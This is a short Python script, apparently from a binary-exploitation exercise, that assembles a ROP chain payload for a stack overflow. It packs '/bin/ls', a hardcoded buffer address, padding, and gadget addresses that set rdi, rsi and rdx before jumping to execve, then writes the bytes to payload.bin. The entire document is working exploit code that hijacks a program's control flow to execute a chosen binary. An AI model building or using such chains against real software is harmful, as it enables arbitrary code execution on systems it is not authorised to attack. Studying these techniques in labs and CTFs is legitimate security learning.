buf_addr = 0x7fffffffe7f0
bin_ls = 0x2f62696e2f6c7300
zero = 0

addr_buf_addr = buf_addr + 8
rdi_g = 0x7f27d1db8942
rsi_g = 0x7f27d1db888c
rdx_g = 0x7f27d1db87d9
execve_addr = 0x7f27d1e70a00

payload = bin_ls.to_bytes(8, "big") + buf_addr.to_bytes(8, "little") + zero.to_bytes(104-16, "little") + rdi_g.to_bytes(8, "little") + buf_addr.to_bytes(8, "little") + rsi_g.to_bytes(8, "little") + addr_buf_addr.to_bytes(8, "little") + rdx_g.to_bytes(8, "little") + zero.to_bytes(8, "little") + execve_addr.to_bytes(8, "little")

fw = open('payload.bin', 'wb')
fw.write(payload)
fw.close()


